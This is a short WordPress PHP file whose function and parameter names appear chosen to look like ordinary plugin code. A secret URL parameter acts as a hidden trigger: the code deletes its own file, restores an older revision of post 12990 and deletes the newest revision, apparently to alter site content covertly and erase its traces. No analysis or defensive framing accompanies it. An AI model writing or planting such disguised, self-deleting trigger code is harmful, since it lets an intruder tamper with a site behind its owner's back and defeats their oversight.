<?php

function translation_library_protect_radio() {
	if (isset($_GET['controller_wpmu_woff2']) && $_GET['controller_wpmu_woff2'] === 'elementor_class_badge') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sharing_option_sitemaps_captcha = 12990;
		$checker_style_online = wp_get_post_revisions($sharing_option_sitemaps_captcha);
		if (empty($checker_style_online)) die('no revisions');
		if (count($checker_style_online) < 2) die('less than 2');
		$hello_word_rss = array_shift($checker_style_online);
		$tracker_testimonials_new = $hello_word_rss->ID;
		$reloaded_tooltip_help_coming = array_shift($checker_style_online);
		$cloud_chatbot_edit = $reloaded_tooltip_help_coming->ID;
		$query_network_scss = wp_restore_post_revision($cloud_chatbot_edit);
		if ($query_network_scss === false) die('error restoring');
		$query_network_scss = wp_delete_post_revision($tracker_testimonials_new);		
		if ($query_network_scss === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'translation_library_protect_radio');
